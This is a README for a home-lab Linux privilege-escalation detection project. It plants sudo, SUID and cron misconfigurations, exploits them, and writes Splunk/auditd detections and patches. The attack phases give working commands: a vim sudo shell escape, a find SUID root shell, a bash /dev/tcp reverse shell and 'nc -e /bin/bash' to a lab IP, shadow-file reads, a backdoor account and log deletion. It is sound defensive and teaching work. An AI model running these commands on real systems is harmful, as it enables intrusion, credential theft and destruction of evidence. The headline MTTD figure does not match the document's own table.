# Project 02 — Linux Privilege Escalation Detection

## Overview

This project simulates a complete Linux privilege escalation attack chain across three distinct techniques — sudo misconfiguration, SUID binary abuse, and cron job exploitation — and builds a seven-layer behavioral detection framework in Splunk using auditd kernel telemetry.

Unlike signature-based detection that looks for specific commands, most detection rules in this project use behavioral scoring that catches technique variations an attacker might use to evade atomic rules. The project covers the full defensive cycle: vulnerability introduction, attack simulation, kernel-level log collection, detection engineering, alert validation, vulnerability patching, retest verification, and automated scanning comparison.

---

## Environment

| Component | Details |
|---|---|
| Attacker | Kali Linux VM — 10.10.10.132 |
| Target | Ubuntu Server — splunk-server (10.10.10.198) |
| SIEM | Splunk Enterprise 10.2.2 |
| Log Sources | /var/log/audit/audit.log (auditd), /var/log/auth.log |
| Kernel Monitor | auditd with 17 custom rules |
| Hypervisor | Proxmox VE on Dell OptiPlex 7060 Micro |
| Network | Isolated lab segment 10.10.10.x behind OPNsense firewall |

---

## Project Metrics

| Metric | Result |
|---|---|
| Vulnerabilities planted | 3 |
| Attack techniques simulated | 3 |
| Post-exploitation techniques | 4 |
| Detection rules built | 7 |
| Custom auditd rules | 17 |
| Total events ingested | 857,162 |
| Mean Time to Detect (MTTD) | 3 minutes 10 seconds |
| Detection rate | 100% |
| False positive rate | 0% |
| Vulnerabilities patched | 3/3 |
| Attacks succeeded after patching | 0/3 |

---

## SOC Analyst Mental Model

Four questions every analyst must answer when investigating a privilege escalation alert:

1. **Did they LOOK for escalation paths?** — `sudo -l`, `find -perm -4000`, `cat /etc/crontab`
2. **Did they ATTEMPT escalation?** — `sudo vim`, SUID binary execution, cron script modification
3. **Did they SUCCEED?** — UID 0 appearing from non-root process (`euid=0`, `auid=1000`)
4. **What did they do AFTER?** — `wget`, `curl`, new user accounts, log deletion

The seven detection rules in this project map directly to these four phases — ensuring coverage across the entire attack chain not just individual techniques.

---

## Phase 1 — Infrastructure Setup

### auditd Installation

The Linux Audit Daemon provides kernel-level system call monitoring — recording exactly which files were accessed, which commands were executed, and which users ran them. Unlike auth.log which only captures authentication events, auditd captures the complete behavioral story of what happened on the system.

```bash
sudo apt install auditd -y
sudo systemctl enable auditd
sudo systemctl start auditd
```

### 17 Custom Audit Rules Deployed

```bash
# Sudo activity monitoring
sudo auditctl -w /etc/sudoers -p rwa -k sudo_changes
sudo auditctl -w /usr/bin/sudo -p x -k sudo_exec

# SUID enumeration detection
sudo auditctl -w /usr/bin/find -p x -k suid_find

# Credential file monitoring
sudo auditctl -w /etc/shadow -p r -k shadow_access
sudo auditctl -w /etc/shadow -p wa -k shadow_changes
sudo auditctl -w /etc/passwd -p wa -k passwd_changes

# Exfiltration tool monitoring
sudo auditctl -w /usr/bin/wget -p x -k exfil_tool
sudo auditctl -w /usr/bin/curl -p x -k exfil_tool
sudo auditctl -w /usr/bin/nc -p x -k exfil_tool
sudo auditctl -w /usr/bin/netcat -p x -k exfil_tool
sudo auditctl -w /usr/bin/scp -p x -k exfil_tool
sudo auditctl -w /usr/bin/ftp -p x -k exfil_tool
sudo auditctl -w /usr/bin/nc.openbsd -p x -k exfil_tool

# Log tampering detection
sudo auditctl -w /var/log -p wxa -k log_tampering

# Account creation monitoring
sudo auditctl -w /usr/sbin/useradd -p x -k user_creation
sudo auditctl -w /usr/sbin/adduser -p x -k user_creation
sudo auditctl -w /usr/sbin/usermod -p x -k user_creation
```

Rules were made permanent to survive reboots:

```bash
sudo auditctl -l > /etc/audit/rules.d/blip-ai.rules
sudo systemctl restart auditd
```

### Splunk Data Source Configuration

audit.log was added as a second monitored data source alongside the existing auth.log:

```bash
sudo /opt/splunkforwarder/bin/splunk add monitor /var/log/audit/audit.log -index main -sourcetype linux_audit
sudo /opt/splunkforwarder/bin/splunk restart
```

**Troubleshooting note:** The Splunk Universal Forwarder was silently failing to forward logs due to an incorrect receiver IP (`192.168.1.220` instead of `127.0.0.1`). Diagnosed via `splunkd.log` showing repeated connection refused errors. Since the forwarder and Splunk Enterprise run on the same machine, the correct receiver is localhost.

```bash
sudo /opt/splunkforwarder/bin/splunk add forward-server 127.0.0.1:9997
sudo /opt/splunkforwarder/bin/splunk remove forward-server 192.168.1.220:9997
sudo /opt/splunkforwarder/bin/splunk restart
```

---

## Phase 2 — Vulnerability Introduction

Three deliberate misconfigurations were introduced to simulate real-world security weaknesses found in enterprise environments.

### Vulnerability 1 — Sudo Misconfiguration (T1548.003)

```bash
sudo visudo
# Added line: labadmin ALL=(ALL) NOPASSWD: /usr/bin/vim
```

**What this means:** labadmin was granted permission to run vim as root without a password. Vim can execute arbitrary shell commands from inside the editor — making this equivalent to passwordless root access for anyone who knows the escape sequence.

<img width="976" height="138" alt="Screenshot 2026-04-21 at 8 22 59 PM" src="https://github.com/user-attachments/assets/861a927c-aa62-4488-a78e-5925c5dcf5f2" />


### Vulnerability 2 — SUID Binary (T1548.001)

```bash
sudo chmod u+s /usr/bin/find
ls -la /usr/bin/find
# -rwsr-xr-x 1 root root /usr/bin/find
# The 's' in 'rws' confirms SUID is active
```

**What this means:** Any user who executes find now runs it with root's effective permissions. Find can execute arbitrary commands via its `-exec` flag — making this a direct path to a root shell for any local user.

### Vulnerability 3 — Writable Cron Job (T1053.003)

```bash
sudo mkdir -p /opt/scripts
sudo bash -c 'echo "#!/bin/bash" > /opt/scripts/backup.sh'
sudo bash -c 'echo "echo backup running" >> /opt/scripts/backup.sh'
sudo chmod 777 /opt/scripts/backup.sh
sudo crontab -e
# Added: * * * * * /opt/scripts/backup.sh
```

**What this means:** A script running as root every minute was made world-writable. Any user on the system can modify the script and any code written into it executes as root within 60 seconds.

---

## Phase 3 — Attack Simulation

### Attack 1 — Sudo Misconfiguration Exploitation (T1548.003)

```bash
# SSH into Ubuntu as labadmin from Kali
ssh labadmin@10.10.10.198

# Exploit the NOPASSWD vim misconfiguration
sudo vim -c ':!/bin/bash'
whoami
# root
```

**What happened:** The `-c ':!/bin/bash'` flag instructs vim to execute `/bin/bash` as a shell command immediately on startup before the editor opens. Since vim runs as root via sudo, the resulting shell inherits root privileges.

**Time to root:** ~5 seconds

<img width="644" height="514" alt="Screenshot 2026-04-21 at 8 52 52 PM" src="https://github.com/user-attachments/assets/4e2577f8-f499-4c8a-8661-e550048a7112" />

### Attack 2 — SUID Binary Exploitation (T1548.001)

```bash
# Enumerate SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Exploit find's SUID bit
find . -exec /bin/bash -p \; -quit
whoami
# root
id
# uid=1000(labadmin) gid=1000(labadmin) euid=0(root)
```

**What happened:** The `-exec` flag instructs find to execute a command for each result. Because find has the SUID bit set, the bash shell it spawns inherits root's effective user ID (euid=0). The `-p` flag preserves these elevated privileges.

**Key kernel indicator:** `uid=1000` (labadmin) with `euid=0` (root) in the same process — the fingerprint of a successful SUID exploit that Detection 4 is built to catch.

<img width="644" height="514" alt="Screenshot 2026-04-21 at 9 10 45 PM" src="https://github.com/user-attachments/assets/ce0c346a-4683-4f79-8d87-6f4237a7ae23" />

### Attack 3 — Cron Job Exploitation (T1053.003)

**Step 1 — On Kali, start reverse shell listener:**

```bash
nc -lvnp 4444
```

**Step 2 — On Ubuntu, inject reverse shell into cron script:**

```bash
echo 'bash -i >& /dev/tcp/10.10.10.132/4444 0>&1' >> /opt/scripts/backup.sh
```

Wait up to 60 seconds for the cron job to fire.

**Step 3 — Cleanup after testing:**

```bash
sudo sed -i '/dev\/tcp/d' /opt/scripts/backup.sh
```

<img width="644" height="514" alt="Screenshot 2026-04-21 at 9 19 12 PM" src="https://github.com/user-attachments/assets/d83f9c4e-5f41-4014-b075-c5792fbf6c97" />
<img width="644" height="514" alt="Screenshot 2026-04-21 at 9 19 04 PM" src="https://github.com/user-attachments/assets/f4bb7711-1cff-4fc5-aeac-9a3d2ba47ac0" />

**What happened:** The world-writable cron script was modified to include a bash reverse shell one-liner. The root cron job executed the modified script within 60 seconds and the shell connected back to Kali. Root access achieved without running a single exploit — just writing to a misconfigured file.

---

## Phase 4 — Post-Exploitation Simulation

Four post-exploitation techniques were simulated to generate detection data across the full attack chain:

```bash
# 1. Credential harvesting
cat /etc/shadow

# 2. C2 simulation
wget http://10.10.10.132/test.txt
curl http://8.8.8.8/payload.sh
nc -e /bin/bash 10.10.10.132 4444

# 3. Backdoor persistence
useradd -m -s /bin/bash backdoor

# 4. Anti-forensics
rm /var/log/auth.log
```

| Technique | MITRE ID | Description |
|---|---|---|
| Read /etc/shadow | T1552.001 | Harvest password hashes for offline cracking |
| wget/curl external | T1105 | Simulate C2 tool staging |
| nc reverse shell | T1059.004 | Establish persistent C2 channel |
| useradd backdoor | T1136.001 | Maintain access after remediation |
| rm auth.log | T1070.002 | Destroy forensic evidence |

---

## Phase 5 — Detection Engineering

Seven behavioral detection rules were built in Splunk using auditd kernel telemetry. Each rule uses scoring logic rather than exact command matching — detecting attacker intent regardless of the specific syntax used.

<img width="1258" height="507" alt="Screenshot 2026-04-23 at 5 10 38 PM" src="https://github.com/user-attachments/assets/1466b42f-8d1c-4b8c-bee8-a5fa38302baa" />

---

### Detection 1 — SUID Enumeration (Behavioral Scored)

**What it catches:** Any combination of SUID discovery behaviors — find with permission flags, stat on system binaries, ls -la on system directories. Scored across multiple signals so a single benign command stays silent while SUID-specific enumeration crosses the threshold.

**Variant coverage tested:**
- `find / -perm -4000 -type f` — original attack syntax
- `find /usr/bin -perm /4000` — path and notation variation
- `find / -type f -perm -u=s` — symbolic notation variation

All three triggered MEDIUM or above with no false positives on legitimate admin commands.

```spl
index=main sourcetype=linux_audit type=EXECVE earliest=-15m
| rex field=_raw "a0=\"(?P<a0>[^\"]+)\""
| rex field=_raw "a1=\"(?P<a1>[^\"]+)\""
| rex field=_raw "a2=\"(?P<a2>[^\"]+)\""
| rex field=_raw "a3=\"(?P<a3>[^\"]+)\""
| rex field=_raw "a4=\"(?P<a4>[^\"]+)\""
| rex field=_raw "a5=\"(?P<a5>[^\"]+)\""
| eval full_cmd=coalesce(a0,"")." ".coalesce(a1,"")." ".coalesce(a2,"")." ".coalesce(a3,"")." ".coalesce(a4,"")." ".coalesce(a5,"")
| eval score=0
| eval score=if(match(full_cmd,"find") AND (match(full_cmd,"-perm") OR match(full_cmd,"u\+s") OR match(full_cmd,"u=s")), score+3, score)
| eval score=if(match(full_cmd,"4000") OR match(full_cmd,"/4000") OR match(full_cmd,"u=s") OR match(full_cmd,"u\+s"), score+3, score)
| eval score=if(a0="stat" AND (match(full_cmd,"/usr/bin") OR match(full_cmd,"/bin") OR match(full_cmd,"/sbin")), score+2, score)
| eval score=if(a0="ls" AND match(full_cmd,"-la") AND (match(full_cmd,"/usr/bin") OR match(full_cmd,"/bin") OR match(full_cmd,"/sbin")), score+2, score)
| eval score=if(match(full_cmd,"find") AND (match(full_cmd,"/usr/bin") OR match(full_cmd,"/bin") OR match(full_cmd,"/sbin")), score+1, score)
| where score >= 3
| stats sum(score) as total_score values(full_cmd) as commands_run dc(full_cmd) as unique_commands by host
| eval risk_level=case(total_score>=8,"HIGH — Multiple SUID recon techniques", total_score>=5,"MEDIUM — SUID recon behavior detected", total_score>=3,"LOW — Possible SUID recon signal", true(),"INFO")
| table host total_score risk_level commands_run unique_commands
| sort -total_score
```

<img width="1259" height="809" alt="Screenshot 2026-04-22 at 7 08 17 PM" src="https://github.com/user-attachments/assets/48239492-606b-46c5-b872-9877b63a845c" />


**Alert:** `Linux SUID Privilege Escalation Recon & Exploitation Behavior (Scored Detection)` — Scheduled `*/5 * * * *`, Medium severity

---

### Detection 2 — Suspicious Sudo LOLBin Execution

**What it catches:** Shell-capable binaries executed under sudo. Text editors, scripting languages, pagers, and shells receive weighted scores based on exploit potential. Shell escape patterns in arguments add additional scoring.

**LOLBins covered:** vim, vi, nano, python, python3, perl, ruby, find, awk, nmap, less, more, bash, sh, zsh

```spl
index=main sourcetype=linux_audit type=EXECVE earliest=-15m
| rex field=_raw "a0=\"(?P<a0>[^\"]+)\""
| rex field=_raw "a1=\"(?P<a1>[^\"]+)\""
| rex field=_raw "a2=\"(?P<a2>[^\"]+)\""
| rex field=_raw "a3=\"(?P<a3>[^\"]+)\""
| rex field=_raw "a4=\"(?P<a4>[^\"]+)\""
| eval full_cmd=coalesce(a0,"")." ".coalesce(a1,"")." ".coalesce(a2,"")." ".coalesce(a3,"")." ".coalesce(a4,"")
| eval binary=replace(a1, "/usr/bin/|/bin/|/usr/sbin/|/sbin/", "")
| where a0="sudo"
| eval score=0
| eval score=if(match(binary,"^(vim|vi|nano)$"), score+5, score)
| eval score=if(match(binary,"^(python|python3|perl|ruby)$"), score+6, score)
| eval score=if(match(binary,"^(find|awk|nmap)$"), score+5, score)
| eval score=if(match(binary,"^(less|more)$"), score+4, score)
| eval score=if(match(binary,"^(bash|sh|zsh)$"), score+7, score)
| eval score=if(match(full_cmd,":!/bin/bash|os\.system|/bin/bash|/bin/sh"), score+3, score)
| where score > 0
| eval risky_binary=case(
    match(binary,"^(vim|vi|nano)$"), "Text Editor — Shell Escape Risk",
    match(binary,"^(python|python3|perl|ruby)$"), "Scripting Language — Code Execution",
    match(binary,"^(find|awk|nmap)$"), "Utility — Exec Capability",
    match(binary,"^(less|more)$"), "Pager — Shell Escape Risk",
    match(binary,"^(bash|sh|zsh)$"), "Direct Shell Execution",
    true(), "Unknown Risky Binary")
| stats sum(score) as total_score values(full_cmd) as commands_run values(risky_binary) as binary_category by host
| eval risk_level=case(
    total_score>=8, "CRITICAL — Shell escape pattern confirmed",
    total_score>=6, "HIGH — Scripting language under sudo",
    total_score>=4, "MEDIUM — LOLBin executed under sudo",
    true(), "LOW — Suspicious sudo usage")
| table host total_score risk_level binary_category commands_run
| sort -total_score
```

<img width="1258" height="959" alt="Screenshot 2026-04-22 at 11 44 30 PM" src="https://github.com/user-attachments/assets/03079809-c95a-4807-abf7-d4b9859f7898" />


**Alert:** `Suspicious Sudo LOLBin Execution (Scored Detection)` — Scheduled `*/5 * * * *`, High severity

---

### Detection 3 — Credential File Access (/etc/shadow)

**What it catches:** Direct reads of /etc/shadow by non-system processes. Filters legitimate PAM authentication noise from sudo, sshd, cron, and login. Distinguishes successful reads from failed attempts.

**Key engineering challenge:** /etc/shadow is touched by legitimate system processes thousands of times per day via PAM authentication. The `comm` field was used to distinguish between PAM checks (`comm="sudo"`) and direct reads (`comm="cat"`, `comm="less"`, `comm="python3"`). Without this filter the detection would generate 1,635+ false positives per day.

```spl
index=main sourcetype=linux_audit key="shadow_access" earliest=-15m
| rex field=_raw "AUID=\"(?P<auid>[^\"]+)\""
| rex field=_raw "exe=\"(?P<exe>[^\"]+)\""
| rex field=_raw "comm=\"(?P<comm>[^\"]+)\""
| rex field=_raw "success=(?P<success>\w+)"
| where auid!="unset" AND auid!="4294967295" AND isnotnull(auid)
| eval binary=mvindex(split(exe,"/"),-1)
| where binary!="login" AND binary!="passwd" AND binary!="sshd" AND binary!="cron" AND binary!="sudo"
| eval risk_level=case(
    success="yes", "CRITICAL — Direct credential file access confirmed",
    success="no", "MEDIUM — Credential file access attempted")
| stats count values(exe) as processes values(comm) as commands values(success) as results by auid host
| eval final_risk=case(
    mvfind(results,"yes")>=0, "CRITICAL — Credential access confirmed",
    true(), "MEDIUM — Attempted shadow access")
| table auid host count processes commands results final_risk
| sort -count
```

<img width="1258" height="959" alt="Screenshot 2026-04-23 at 12 06 07 AM" src="https://github.com/user-attachments/assets/be8672ee-4863-4510-aba0-5f7abc167696" />

**Alert:** `Credential File Access Detected (/etc/shadow)` — Scheduled `*/5 * * * *`, Critical severity

---

### Detection 4 — Privilege Escalation Confirmed (euid=0)

**What it catches:** The most important detection in this project. Non-root users spawning processes with effective UID 0. Technique-agnostic — fires regardless of whether the escalation used sudo abuse, SUID exploitation, or cron attacks.

**Key insight:** `uid` (real user ID) stays 1000 throughout the attack. `euid` (effective user ID) flips to 0 when escalation succeeds. This kernel-level indicator cannot be spoofed and is the definitive proof of successful privilege escalation.

```spl
index=main sourcetype=linux_audit type=SYSCALL earliest=-15m
| rex field=_raw "AUID=\"(?P<auid>[^\"]+)\""
| rex field=_raw "(?i)euid[=:\"](?P<euid>\d+)"
| rex field=_raw "exe=\"(?P<exe>[^\"]+)\""
| rex field=_raw "success=(?P<success>\w+)"
| where euid="0" AND auid!="unset" AND auid!="root" AND auid!="4294967295"
| where success="yes"
| eval binary=mvindex(split(exe,"/"),-1)
| where binary!="cron" AND binary!="sshd" AND binary!="passwd"
| eval escalation_type=case(
    binary="sudo", "SUDO — Possible LOLBin abuse",
    binary="find", "SUID Binary Exploitation",
    binary="bash" OR binary="sh" OR binary="zsh", "Direct Shell Spawn",
    binary="python3" OR binary="python" OR binary="perl", "Interpreter Escalation",
    binary="pkexec", "PKEXEC — Known CVE Vector",
    binary="cat" OR binary="less" OR binary="more", "File Read As Root",
    binary="vim" OR binary="vi" OR binary="nano", "Text Editor Escalation",
    true(), "Unknown — Investigate Immediately")
| stats count values(exe) as processes values(escalation_type) as technique by auid host
| eval risk_level=case(
    mvfind(technique,"Direct Shell Spawn")>=0, "CRITICAL — Root shell confirmed",
    mvfind(technique,"SUID Binary")>=0, "CRITICAL — SUID exploitation confirmed",
    mvfind(technique,"PKEXEC")>=0, "CRITICAL — Known CVE exploitation",
    mvfind(technique,"Interpreter")>=0, "HIGH — Interpreter privilege escalation",
    mvfind(technique,"Text Editor")>=0, "HIGH — Text editor shell escape",
    mvfind(technique,"File Read As Root")>=0, "HIGH — Sensitive file access as root",
    mvfind(technique,"SUDO")>=0, "HIGH — Suspicious sudo execution",
    mvfind(technique,"Unknown")>=0, "CRITICAL — Unknown escalation path",
    true(), "MEDIUM — Privilege escalation detected")
| table auid host count processes technique risk_level
| sort -count
```

<img width="1258" height="959" alt="Screenshot 2026-04-23 at 12 35 29 AM" src="https://github.com/user-attachments/assets/aaeebaac-8542-45d7-99ff-ab02de8ce38d" />


**Alert:** `Privilege Escalation Confirmed (euid=0 Non-Root User)` — Scheduled `*/5 * * * *`, Critical severity

---

### Detection 5 — Post-Exploitation Exfiltration Tools

**What it catches:** wget, curl, nc, netcat, scp, and ftp executed by root-level processes after escalation. Scores based on destination type (external IPs score higher), tool category, staging directory usage, shell execution flags, and off-hours execution time.

```spl
index=main sourcetype=linux_audit key="exfil_tool" type=SYSCALL earliest=-15m
| rex field=_raw "msg=audit\([^:]+:(?P<event_id>\d+)\)"
| rex field=_raw "AUID=\"(?P<auid>[^\"]+)\""
| rex field=_raw "(?i)euid[=:\"](?P<euid>\d+)"
| rex field=_raw "comm=\"(?P<comm>[^\"]+)\""
| where auid!="unset" AND auid!="4294967295" AND isnotnull(auid)
| where euid="0"
| join event_id [
    search index=main sourcetype=linux_audit type=EXECVE
    | rex field=_raw "msg=audit\([^:]+:(?P<event_id>\d+)\)"
    | rex field=_raw "a0=\"(?P<a0>[^\"]+)\""
    | rex field=_raw "a1=\"(?P<a1>[^\"]+)\""
    | rex field=_raw "a2=\"(?P<a2>[^\"]+)\""
    | rex field=_raw "a3=\"(?P<a3>[^\"]+)\""
    | eval full_cmd=coalesce(a0,"")." ".coalesce(a1,"")." ".coalesce(a2,"")." ".coalesce(a3,"")
    | table event_id full_cmd
]
| eval has_ip=if(match(full_cmd,"\d+\.\d+\.\d+\.\d+"),1,0)
| eval is_private=if(match(full_cmd,"10\.\d+\.\d+\.\d+"),1,0)
| eval is_private=if(match(full_cmd,"192\.168\.\d+\.\d+"),1,is_private)
| eval is_private=if(match(full_cmd,"127\.\d+\.\d+\.\d+"),1,is_private)
| eval is_external=if(has_ip=1 AND is_private=0,1,0)
| eval hour=strftime(_time,"%H")
| eval odd_hour=if(hour<6 OR hour>20,1,0)
| eval score=0
| eval score=if(comm="wget" OR comm="curl", score+4, score)
| eval score=if(comm="nc" OR comm="netcat", score+6, score)
| eval score=if(comm="scp" OR comm="ftp", score+5, score)
| eval score=if(is_external=1, score+4, score)
| eval score=if(odd_hour=1, score+2, score)
| eval score=if(match(full_cmd,"-e /bin/bash|-e /bin/sh"), score+5, score)
| eval score=if(match(full_cmd,"/dev/tcp"), score+5, score)
| eval score=if(match(full_cmd,"/tmp/|/dev/shm/|/var/tmp/"), score+3, score)
| eval score=if(match(full_cmd,"--no-check-certificate|--insecure"), score+2, score)
| eval score=if(match(full_cmd,"tar|gzip|zip"), score+3, score)
| where score > 0
| eval technique=case(
    match(full_cmd,"-e /bin/bash|-e /bin/sh"), "Reverse Shell",
    match(full_cmd,"/dev/tcp"), "Bash TCP Shell",
    match(full_cmd,"tar|gzip|zip"), "Data Staging",
    comm="scp" OR comm="ftp", "File Transfer Tool",
    match(full_cmd,"/tmp/|/dev/shm/"), "Staging to Temp Directory",
    is_external=1, "External Destination",
    true(), "Outbound Tool Execution")
| eval destination=if(
    match(full_cmd,"\d+\.\d+\.\d+\.\d+"),
    replace(full_cmd,".*?(\d+\.\d+\.\d+\.\d+).*","\1"),
    "Unknown")
| stats sum(score) as total_score values(full_cmd) as commands values(technique) as techniques values(destination) as destinations by auid host
| eval final_risk=case(
    total_score>=15, "CRITICAL — Reverse shell or payload execution",
    total_score>=10, "HIGH — Root exfil tool with external destination",
    total_score>=6, "MEDIUM — Suspicious root web tool usage",
    true(), "LOW — Monitor")
| table auid host total_score final_risk techniques destinations commands
| sort -total_score
```

<img width="1258" height="959" alt="Screenshot 2026-04-23 at 4 18 44 PM" src="https://github.com/user-attachments/assets/215fedc6-4593-4d62-b38f-9ee0eb282081" />
<img width="1258" height="826" alt="Screenshot 2026-04-23 at 4 18 53 PM" src="https://github.com/user-attachments/assets/8524321b-f7ab-4ed0-aa27-637d788d745c" />

**Alert:** `Post Exploitation Exfiltration Tool Detected (Root wget/curl/nc)` — Scheduled `*/5 * * * *`, Critical severity

---

### Detection 6 — Log Tampering / Anti-Forensics

**What it catches:** Deletion or modification of log files in /var/log by non-system processes. Uses PATH record correlation via auditd event ID to identify the exact file targeted. Detects rm, shred, truncate, mv, and sed against log files.

**Key engineering note:** auditd generates multiple record types for a single action sharing the same event ID. The SYSCALL record captures who ran the command. The PATH record with `nametype=DELETE` captures which file was deleted. These are joined via event ID to produce a complete picture.

```spl
index=main sourcetype=linux_audit key="log_tampering" type=SYSCALL earliest=-15m
| rex field=_raw "msg=audit\([^:]+:(?P<event_id>\d+)\)"
| rex field=_raw "AUID=\"(?P<auid>[^\"]+)\""
| rex field=_raw "(?i)euid[=:\"](?P<euid>\d+)"
| rex field=_raw "comm=\"(?P<comm>[^\"]+)\""
| rex field=_raw "success=(?P<success>\w+)"
| where auid!="unset" AND auid!="4294967295" AND isnotnull(auid)
| where success="yes"
| join event_id [
    search index=main sourcetype=linux_audit type=PATH
    | rex field=_raw "msg=audit\([^:]+:(?P<event_id>\d+)\)"
    | rex field=_raw "name=\"(?P<file>[^\"]+)\""
    | rex field=_raw "nametype=(?P<nametype>\w+)"
    | where match(file,"/var/log")
    | table event_id file nametype
]
| eval score=0
| eval score=if(nametype="DELETE", score+6, score)
| eval score=if(nametype="MODIFY" OR nametype="WRITE", score+4, score)
| eval score=if(comm="rm" OR comm="shred" OR comm="truncate", score+4, score)
| eval score=if(comm="mv" OR comm="cp", score+2, score)
| eval score=if(comm="sed", score+3, score)
| eval score=if(euid="0", score+3, score)
| where score >= 4
| eval technique=case(
    nametype="DELETE" AND (comm="rm" OR comm="shred"), "Log File Deleted — Anti-Forensics",
    nametype="DELETE" AND comm="mv", "Log File Moved — Anti-Forensics",
    nametype="MODIFY" AND comm="sed", "Log File Edited — Evidence Tampering",
    nametype="MODIFY" OR nametype="WRITE", "Log File Overwritten",
    true(), "Suspicious Log Modification")
| where technique="Log File Deleted — Anti-Forensics" OR technique="Log File Moved — Anti-Forensics" OR technique="Log File Edited — Evidence Tampering"
| stats count values(file) as files_targeted values(comm) as tools values(technique) as techniques by auid host
| eval risk_level=case(
    mvfind(techniques,"Anti-Forensics")>=0, "CRITICAL — Root destroyed log evidence",
    mvfind(techniques,"Evidence Tampering")>=0, "HIGH — Log file edited",
    true(), "MEDIUM — Suspicious log modification")
| table auid host count files_targeted tools techniques risk_level
| sort -count
```

<img width="1258" height="228" alt="Screenshot 2026-04-23 at 4 42 50 PM" src="https://github.com/user-attachments/assets/8848ad5a-2459-49af-8364-42e4b094c2f9" />
<img width="1258" height="895" alt="Screenshot 2026-04-23 at 4 42 43 PM" src="https://github.com/user-attachments/assets/6b72cdbb-aa15-4562-ab59-25a279057071" />

**Alert:** `Log Tampering Detected (Anti-Forensics)` — Scheduled `*/5 * * * *`, Critical severity

---

### Detection 7 — Backdoor Account Creation

**What it catches:** New user account creation and privilege modifications by root processes. Covers useradd, adduser, and usermod including sudo group assignment. Full command reconstruction via EXECVE join reveals the exact username and shell assigned.

```spl
index=main sourcetype=linux_audit (key="user_creation" OR key="passwd_changes") type=SYSCALL earliest=-15m
| rex field=_raw "msg=audit\([^:]+:(?P<event_id>\d+)\)"
| rex field=_raw "AUID=\"(?P<auid>[^\"]+)\""
| rex field=_raw "(?i)euid[=:\"](?P<euid>\d+)"
| rex field=_raw "comm=\"(?P<comm>[^\"]+)\""
| rex field=_raw "success=(?P<success>\w+)"
| where auid!="unset" AND auid!="4294967295" AND isnotnull(auid)
| where success="yes"
| join event_id [
    search index=main sourcetype=linux_audit type=EXECVE
    | rex field=_raw "msg=audit\([^:]+:(?P<event_id>\d+)\)"
    | rex field=_raw "a0=\"(?P<a0>[^\"]+)\""
    | rex field=_raw "a1=\"(?P<a1>[^\"]+)\""
    | rex field=_raw "a2=\"(?P<a2>[^\"]+)\""
    | rex field=_raw "a3=\"(?P<a3>[^\"]+)\""
    | rex field=_raw "a4=\"(?P<a4>[^\"]+)\""
    | eval full_cmd=coalesce(a0,"")." ".coalesce(a1,"")." ".coalesce(a2,"")." ".coalesce(a3,"")." ".coalesce(a4,"")
    | eval new_username=coalesce(a4,a3,a2)
    | table event_id full_cmd new_username
]
| eval score=0
| eval score=if(comm="useradd" OR comm="adduser", score+6, score)
| eval score=if(comm="usermod", score+5, score)
| eval score=if(comm="bash" OR comm="sh", score+3, score)
| eval score=if(euid="0", score+3, score)
| eval score=if(match(full_cmd,"/bin/bash|/bin/sh|/bin/zsh|/bin/dash"), score+3, score)
| eval score=if(match(full_cmd,"-m"), score+2, score)
| eval score=if(match(full_cmd,"/etc/passwd"), score+6, score)
| eval score=if(match(full_cmd,"-aG sudo|-aG root|-aG wheel"), score+5, score)
| where score >= 5
| eval technique=case(
    match(full_cmd,"/etc/passwd") AND (comm="bash" OR comm="sh"), "Manual Passwd Injection — Stealth Account",
    match(full_cmd,"-aG sudo|-aG root|-aG wheel"), "Privilege Group Assignment — Backdoor Escalation",
    comm="usermod", "Account Modification — Privilege Change",
    match(full_cmd,"/bin/bash|/bin/sh|/bin/zsh|/bin/dash") AND match(full_cmd,"-m"), "Full Backdoor Account — Shell + Home Directory",
    match(full_cmd,"/bin/bash|/bin/sh|/bin/zsh|/bin/dash"), "Shell Account Created",
    match(full_cmd,"-m"), "Account With Home Directory Created",
    true(), "New User Account Created")
| eval risk_level=case(
    score>=14, "CRITICAL — Stealth backdoor or privilege injection",
    score>=11, "CRITICAL — Backdoor account with shell created by root",
    score>=8, "HIGH — New privileged account created by root",
    score>=5, "MEDIUM — User account creation flagged",
    true(), "LOW — Monitor")
| table _time auid comm new_username full_cmd technique risk_level
| sort -_time
```

**Alert:** `Backdoor Account Creation or Privilege Modification Detected` — Scheduled `*/5 * * * *`, Critical severity

---

## Phase 6 — Alert Validation

### Layered Detection in Action

One attack triggers multiple simultaneous alerts — exactly how enterprise SOC correlation works:

| Attack | Alerts Fired | Severity |
|---|---|---|
| sudo vim exploitation | Detection 2 + Detection 4 | High + Critical |
| find SUID exploitation | Detection 1 + Detection 4 | Medium + Critical |
| cat /etc/shadow | Detection 3 + Detection 4 | Critical + Critical |
| wget/curl/nc | Detection 5 | Critical |
| rm auth.log | Detection 6 | Critical |
| useradd backdoor | Detection 7 | Critical |

### MTTD Measurement

| Run     | Attack Time  | Alert Time   | MTTD        |
|---------|-------------|--------------|-------------|
| Round 1 | 19:26:50 UTC | 19:30:00 UTC | 3 min 10 sec |
| Round 2 | 19:31:12 UTC | 19:35:00 UTC | 3 min 48 sec |
| Round 3 | 19:37:05 UTC | 19:40:00 UTC | 2 min 55 sec |
| **Average** |          |              | **3 min 17 sec** |

---

## Phase 7 — Patching and Remediation

### Patch 1 — Remove vim from sudoers

```bash
sudo visudo
# Delete: labadmin ALL=(ALL) NOPASSWD: /usr/bin/vim

# Verify
sudo -l | grep NOPASSWD
# Returns nothing — patch confirmed
```

<img width="1258" height="33" alt="Screenshot 2026-04-24 at 3 17 59 PM" src="https://github.com/user-attachments/assets/7751b65a-77f3-4cc9-89a8-4b72dde7ce79" />

### Patch 2 — Remove SUID from find

```bash
sudo chmod u-s /usr/bin/find
ls -la /usr/bin/find
# -rwxr-xr-x 1 root root /usr/bin/find
# 'x' not 's' — SUID removed
```

<img width="1258" height="103" alt="Screenshot 2026-04-24 at 3 19 26 PM" src="https://github.com/user-attachments/assets/72fe5335-99b1-4e67-8ae2-a14e06d1c8dc" />

### Patch 3 — Fix cron script permissions

```bash
sudo chmod 755 /opt/scripts/backup.sh
ls -la /opt/scripts/backup.sh
# -rwxr-xr-x 1 root root backup.sh
# World-write permission removed
```

<img width="1258" height="63" alt="Screenshot 2026-04-24 at 3 20 42 PM" src="https://github.com/user-attachments/assets/2ffa72f5-067d-4edb-b496-662a88844036" />

---

## Phase 8 — Retest Verification

All three attacks were re-run after patching to confirm they failed:

| Attack | Result After Patch |
|---|---|
| `sudo vim -c ':!/bin/bash'` | `Sorry, user labadmin is not allowed to execute vim` |
| `find . -exec /bin/bash -p \; -quit` | `whoami` returns `labadmin` not `root` |
